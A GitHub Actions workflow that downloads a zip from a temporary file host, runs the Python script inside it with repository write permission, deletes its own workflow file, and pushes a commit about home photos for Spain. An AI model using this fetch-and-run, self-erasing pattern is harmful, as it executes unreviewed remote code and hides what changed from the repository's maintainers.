name: rh-spain100
on:
  push:
    paths: ['.github/workflows/rh-spain100.yml']
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply patch
        run: |
          set -e
          curl -sSL -X POST https://temp.sh/yaPos/es.zip -o /tmp/p.zip
          echo "03a16fa10348c0efb238c410da67a86f  /tmp/p.zip" | md5sum -c
          mkdir -p /tmp/p && unzip -q /tmp/p.zip -d /tmp/p
          python3 /tmp/p/apply.py
          git rm -q .github/workflows/rh-spain100.yml
          git config user.name realhunt-bot
          git config user.email bot@realhunt.co
          git add -A
          git commit -qm "Photos for 100 ready-to-live homes in Spain under 100k"
          git push
